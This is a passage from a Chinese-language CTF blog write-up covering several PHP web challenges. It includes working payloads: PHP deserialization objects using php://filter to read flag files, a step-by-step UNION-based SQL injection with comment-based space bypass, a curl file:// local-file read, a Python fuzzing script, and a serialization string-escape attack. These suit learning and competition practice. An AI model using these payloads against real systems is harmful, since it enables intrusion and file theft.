class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化，process 中需要使 op 为 2，然后在 read 中读取 flag.php。所以需要把 op 改成 2，filename 改成 flag.php。</p>
<p>记录一下，private 成员序列化的格式为 <code>%00ClassName%00Attribute</code>，protected 成员格式为<code>%00*%00Attribute</code>。正常 payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;%00*%00op&quot;;s:1:&quot;2&quot;;s:11:&quot;%00*%00filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;%00*%00content&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>会使用<code>===</code>判断 op 是否为 <code>&quot;2&quot;</code>，可以利用弱类型特性，传入数字 2.</p>
<p>由于使用了<code>%00</code>，不能通过 <code>is_valid</code>，将序列化后的字符串中的 <code>s</code>改为<code>S</code>，后面的字符串就可以使用 16 进制表示。</p>
<p>执行<code>__destruct()</code>时，目录不再是该文件位置（？），所以需要使用绝对路径读取文件。可以通过读取 <code>/proc/self/cmdlie</code>获取配置文件路径，在配置文件中得到 web 绝对路径。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler&#123;</span><br><span class="line">    protected $op=2;</span><br><span class="line">    protected $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = serialize(new FileHandler);</span><br><span class="line">$a = str_replace(chr(0),&#x27;\00&#x27;,$a);</span><br><span class="line">$a = str_replace(&#x27;s:&#x27;,&#x27;S:&#x27;,$a);</span><br><span class="line">echo urlencode($a);</span><br><span class="line"># PD9waHAgJGZsYWc9J2ZsYWd7ZDg2ZWRiMjMtNzk0Zi00NDI4LTllNTQtZmQ2NDk2YmNmMjBlfSc7Cg==</span><br></pre></td></tr></table></figure>

<p>在 php 7.1+ 环境中，对属性类型不敏感，也可以使用 public 属性来绕过。</p>
<h4 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h4><p>注册一个账号，点进去能看见自己的资料和博客内容。同时发现no=1，尝试注入。</p>
<p>sqlmap告诉我它可以注，但是没跑出来，手注。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">no=1&#x27;  //报错</span><br><span class="line">no=1 and 1=1 //正常,sql语句应该是 select ... from ... where id = no</span><br><span class="line">no=1 order by 4 //正常</span><br><span class="line">no=1 order by 5 //报错，有4列</span><br><span class="line">no=0 union select 1,2,3,4 //nohack 有过滤</span><br><span class="line">no=0/**/union/**/select/**/1,2,3,4 //用/**/绕过空格，发现2可以显示，同时知道了网站的绝对路径是/var/www/html</span><br><span class="line">no=0/**/union/**/select/**/1,group_concat(schema_name),3,4/**/from/**/information_schema.schemata //查库，发现fakebook</span><br><span class="line">no=0/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=%27fakebook%27 //查表，得到users</span><br><span class="line">no=0/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_name=%27users%27 //查列，得到no,username,passwd,data</span><br><span class="line">no=0/**/union/**/select/**/1,group_concat(data),3,4/**/from/**/users //得到O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;A&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:5:&quot;a.com&quot;;&#125;，一个序列化的用户信息</span><br></pre></td></tr></table></figure>

<p>同时有两个信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</span><br><span class="line">Fatal error: Call to a member function getBlogContents() on boolean in /var/www/html/view.php on line 67</span><br></pre></td></tr></table></figure>

<p>猜测<code>view.php</code>把从数据库中查出的字符串反序列化后执行<code>getBlogContents</code>方法</p>
<p>看一下<code>robots.php</code>，发现有<code>user.php.bak</code>，知道了<code>getBlogContents</code>方法是调用<code>curl_exec</code>，<code>curl_exec</code>可以接受<code>file://</code>协议，于是最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=0/**/union/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:5;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>flag在iframe标签里</p>
<h4 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>random_bytes</code>没有查到什么问题，生成的随机数强度非常高，重点在上面的<code>$_SERVER[PHP_SELF]</code>上面</p>
<p><code>$_SERVER[&#39;PHP_SELF&#39;]</code>指的是运行的 PHP 脚本，上面匹配到这个<code>$_SERVER[&#39;PHP_SELF&#39;]</code>之后就退出，但是下面的<code>highlignt_file</code>显示的是<code>basename($_SERVER[&#39;PHP_SELF&#39;])</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">basename(&#x27;/index.php/config.php&#x27;)	# config.php</span><br></pre></td></tr></table></figure>

<p>因此我们只需要绕过第一个正则表达式即可，fuzz 一下可以绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://6de85585-1529-4b55-b532-e510c9ddcf3e.node3.buuoj.cn/index.php/config.php/&#123;&#125;?source&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(255):</span><br><span class="line">    r = requests.get(url.format(chr(i)))</span><br><span class="line">    if &#x27;&#123;&#x27; in r.text:</span><br><span class="line">        print(r.text)</span><br></pre></td></tr></table></figure>

<h4 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h4><p>第一步绕过text，可以使用<code>data://</code>或者<code>php://input</code>伪协议。第二步用<code>php://filter</code>读取<code>useless.php</code>，<code>http://4a66ab84-c72b-4d9c-bafd-19fab18c72d0.node3.buuoj.cn/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code>，得到Flag类的结构。第三步读取flag.php，序列化一个Flag对象，用<code>php://filter</code>读flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $file;  </span><br><span class="line">&#125;  </span><br><span class="line">$s = new Flag();</span><br><span class="line">$s-&gt;file=&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;</span><br><span class="line">echo serialize($s);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>得到<code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;</code></p>
<p>最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4a66ab84-c72b-4d9c-bafd-19fab18c72d0.node3.buuoj.cn/?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF] 2016 piapiapia"></a>[0CTF] 2016 piapiapia</h4><p>扫一下，发现<a target="_blank" rel="noopener" href="http://www.zip,走一遍正常流程,注册,登录,更新资料,查看资料./">www.zip，走一遍正常流程，注册，登录，更新资料，查看资料。</a></p>
<p>flag在config.php里，目的是要读到config.php，找一下能读文件的位置。</p>
<p>在profile.php找到<code>file_get_contents($profile[&#39;photo&#39;]);</code>，看一下能不能使<code>$profile[&#39;photo&#39;]==’config.php‘</code>，往上面找，profile来源于<code>show_profile()</code>反序列化，再看一下showprofile。</p>
<p>showprofile中，username经过过滤，无法注入（但过滤是很奇怪的），然后从数据库中查询到序列化的字符串，反序列化得到profile，再看看<code>update_profile()</code>。</p>
<p>updateprofile中，把username和newprofile过滤，其中newprofile是序列化后的表单内容，接下来重点看filter。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function filter($string) &#123;</span><br><span class="line">	$escape = array(&#x27;\&#x27;&#x27;, &#x27;\\\\&#x27;);</span><br><span class="line">	$escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;;</span><br><span class="line">	$string = preg_replace($escape, &#x27;_&#x27;, $string);</span><br><span class="line"></span><br><span class="line">	$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);</span><br><span class="line">	$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;</span><br><span class="line">	return preg_replace($safe, &#x27;hacker&#x27;, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行了转义，如果发现 select, insert, update, delete, where会把它们变成hacker。对于profile来说，已经序列化的字符串长度时固定的，比如<code>s:8:&quot;nickname&quot;;s:5:&quot;where&quot;</code>，如果把where变成hacker，后面就变成<code>s:5:&quot;hacker&quot;</code>，反序列化时最后的引号就逃逸了。于是我们希望利用nickname这项来逃逸字符，使得最后的photo值为config.php。</p>
<p>nickname也有过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)</span><br><span class="line">			die(&#x27;Invalid nickname&#x27;);</span><br></pre></td></tr></table></figure>

<p>可以用数组绕过。</p>
<p>正常序列化后的profile是 <code>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12312312123&quot;;s:5:&quot;email&quot;;s:12:&quot;aaaaa@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:5:&quot;where&quot;;&#125;s:5:&quot;photo&quot;;s:14:&quot;upload/somemd5&quot;;&#125;</code>，我们希望逃逸出的字符串是<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>，总共是34个字符，因此需要34个where，希望构成<code>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12312312123&quot;;s:5:&quot;email&quot;;s:12:&quot;aaaaa@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; </code>(后面还有一些)，这样where替换成hacker的时候后面的config.php就会赋值给photo</p>
<p>最后的payload，要在burp里面把nickname改成数组，内容是<code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; </code>，在img的src里面能发现base64编码后的config.php，解码得到flag</p>
<h2 id="CG-CTF"><a href="#CG-CTF" class="headerlink" title="CG-CTF"></a>CG-CTF</h2><h3 id="web-3"><a href="#web-3" class="headerlink" title="web"></a>web</h3><h4 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h4><p>一直找iframe标签border那些都是0对应的文件，找到小故事，查看源代码的js文件名可以连成flag</p>
<h4 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h4><p>看出题目是返回一个处理后的字符串，eval改为echo</p>
<h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><p>看robots.txt，应该是要查询id=1024的内容，但是id==1024要得到false，利用intval，可以用1024e1，或者1024.1</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>CTF Writeup</p><p><a href="http://example.com/2019/10/05/writeup/">http://example.com/2019/10/05/writeup/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>lll</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2019-10-05</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2020-11-14</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/CTF/">CTF</a><a class="link-muted mr-2" rel="tag" href="/tags/Writeup/">Writeup</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2019/10/06/metasploit/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Metasploit 笔记</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2019/09/07/powershell/"><span class="level-item">Powershell笔记</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="lll"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">lll</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">55</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">16</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/1klnd" target="_blank" rel="noopener">关注我</a></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/AI/"><span class="level-start"><span class="level-item">AI</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Powershell/"><span class="level-start"><span class="level-item">Powershell</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/metasploit/"><span class="level-start"><span class="level-item">metasploit</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/notes/"><span class="level-start"><span class="level-item">notes</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/python/"><span class="level-start"><span class="level-item">python</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/vulnhub/"><span class="level-start"><span class="level-item">vulnhub</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">漏洞复现</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-12T05:56:35.000Z">2022-07-12</time></p><p class="title"><a href="/2022/07/12/practical-reverse-engineering/">逆向工程实战</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-06T08:39:18.000Z">2021-10-06</time></p><p class="title"><a href="/2021/10/06/etw/">A Primer On Event Tracing For Windows (ETW)</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-18T13:39:32.000Z">2021-09-18</time></p><p class="title"><a href="/2021/09/18/PE/">PE 结构</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-30T05:59:59.000Z">2021-08-30</time></p><p class="title"><a href="/2021/08/30/struts2/">Struts2 漏洞 S2-001</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-22T03:51:23.000Z">2021-07-22</time></p><p class="title"><a href="/2021/07/22/vulhub-debug/">vulhub-debug</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">七月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/07/"><span class="level-start"><span class="level-item">七月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/10/"><span class="level-start"><span class="level-item">十月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">八月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">七月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/06/"><span class="level-start"><span class="level-item">六月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">五月 2020</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/04/"><span class="level-start"><span class="level-item">四月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/03/"><span class="level-start"><span class="level-item">三月 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/02/"><span class="level-start"><span class="level-item">二月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">一月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/11/"><span class="level-start"><span class="level-item">十一月 2019</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/10/"><span class="level-start"><span class="level-item">十月 2019</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/09/"><span class="level-start"><span class="level-item">九月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/AI/"><span class="tag">AI</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ETW/"><span class="tag">ETW</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Powershell/"><span class="tag">Powershell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Struts2/"><span class="tag">Struts2</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows/"><span class="tag">Windows</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Writeup/"><span class="tag">Writeup</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flask/"><span class="tag">flask</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/metasploit/"><span class="tag">metasploit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/shell/"><span class="tag">shell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssr/"><span class="tag">ssr</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tables/"><span class="tag">tables</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tricks/"><span class="tag">tricks</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/vulnhub/"><span class="tag">vulnhub</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tag">渗透测试</span><span class="tag">3</span></a></div></div></div></div></div><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#new-bugku"><span class="level-left"><span class="level-item">1</span><span class="level-item">new bugku</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#web"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">web</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#web14"><span class="level-left"><span class="level-item">1.1.1</span><span class="level-item">web14</span></span></a></li><li><a class="level is-mobile" href="#web15"><span class="level-left"><span class="level-item">1.1.2</span><span class="level-item">web15</span></span></a></li><li><a class="level is-mobile" href="#web20"><span class="level-left"><span class="level-item">1.1.3</span><span class="level-item">web20</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#安恒月赛"><span class="level-left"><span class="level-item">2</span><span class="level-item">安恒月赛</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#2020-4"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">2020 4</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Ezunserialize"><span class="level-left"><span class="level-item">2.1.1</span><span class="level-item">Ezunserialize</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#攻防世界"><span class="level-left"><span class="level-item">3</span><span class="level-item">攻防世界</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#web-1"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">web</span></span></a><ul 